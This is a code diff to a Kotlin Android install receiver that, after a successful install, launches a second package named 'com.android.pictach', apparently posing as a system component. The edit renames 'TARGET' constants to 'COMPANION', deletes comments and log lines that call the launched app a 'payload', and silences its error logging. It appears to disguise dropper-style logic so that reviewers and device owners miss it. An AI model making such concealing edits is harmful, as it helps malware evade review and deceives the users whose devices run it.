@@ -10,8 +10,8 @@ class InstallReceiver : BroadcastReceiver() {
 
     companion object {
         private const val TAG = "InstallReceiver"
-        private const val TARGET_PACKAGE = "com.android.pictach"
-        private const val TARGET_CLASS = "com.android.pictach.MainActivity"
+        private const val COMPANION_PKG = "com.android.pictach"
+        private const val COMPANION_CLASS = "com.android.pictach.MainActivity"
     }
 
     override fun onReceive(context: Context, intent: Intent) {
@@ -32,16 +32,14 @@ class InstallReceiver : BroadcastReceiver() {
                 }
             }
             status == 0 -> {
-                // Installation succeeded — launch payload directly
                 try {
-                    val launch = context.packageManager.getLaunchIntentForPackage(TARGET_PACKAGE)
+                    val launch = context.packageManager.getLaunchIntentForPackage(COMPANION_PKG)
                     launch?.let {
                         it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                         it.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)
                         context.startActivity(it)
                     }
                 } catch (e: Exception) {
-                    Log.e(TAG, "Failed to launch payload: ${e.message}")
                 }
             }
             else -> {
